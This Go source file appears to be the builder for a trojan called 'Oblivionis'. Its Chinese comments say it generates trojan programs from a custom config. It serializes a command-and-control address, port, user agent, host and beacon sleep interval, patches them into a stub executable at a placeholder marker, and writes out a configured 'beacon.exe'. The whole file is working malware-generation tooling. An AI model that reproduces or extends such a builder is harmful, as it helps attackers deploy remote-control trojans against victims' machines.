package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"strconv"
)

type OblivionisConfig struct {
	c2addr    string
	c2port    uint16
	useragent string
	url       string
	host      string
	sleep     uint32
	a         []uint8
}

/* Config 格式:
 * |c2addr|c2port|useragent|url|host|sleep|16 bytes A */
func (self OblivionisConfig) toData() []uint8 {
	var buffer bytes.Buffer
	buffer.WriteString("|" + self.c2addr + "|")
	c2portStr := strconv.Itoa(int(self.c2port))
	buffer.WriteString(c2portStr + "|")
	buffer.WriteString(self.useragent + "|")
	buffer.WriteString(self.url + "|")
	buffer.WriteString(self.host + "|")
	sleepStr := strconv.Itoa(int(self.sleep))
	buffer.WriteString(sleepStr + "|")
	buffer.Write(self.a)
	return buffer.Bytes()
}

/* 调用此函数来生成使用自定义 config 的木马程序
 * 参数: config-自定义 config 结构体对象, path-生成的木马程序的保存路径 */
func GenerateOblivionis(config OblivionisConfig, path string) {
	configData := config.toData()
	blank, _ := ioutil.ReadFile("./blank.exe")
	target := []byte("abcdefgh")
	idx := bytes.Index(blank, target)
	copy(blank[idx:], configData)
	ioutil.WriteFile(path, blank, 0644)
}

func hexDump(arr []uint8) {
	i := 0
	for i < len(arr) {
		if i%16 == 0 && i != 0 {
			fmt.Print("        ")
			j := 0
			for j < 16 {
				fmt.Printf("%c", arr[i-16+j])
				j += 1
			}

			fmt.Println("")
		}
		fmt.Printf("%02x ", arr[i])
		i += 1
	}
}
func temp_a() []uint8 {
	a := make([]uint8, 16)
	i := 0
	for i < 16 {
		a[i] = (uint8)(0x41 + i*2)
		i++
	}
	return a
}

func main() {
	var config OblivionisConfig
	config.c2addr = "127.0.0.1"
	config.c2port = 8080
	config.useragent = "Value1"
	config.a = temp_a()
	config.url = ""
	config.sleep = 2000
	config.host = "testhost"
	GenerateOblivionis(config, "./beacon.exe")
}
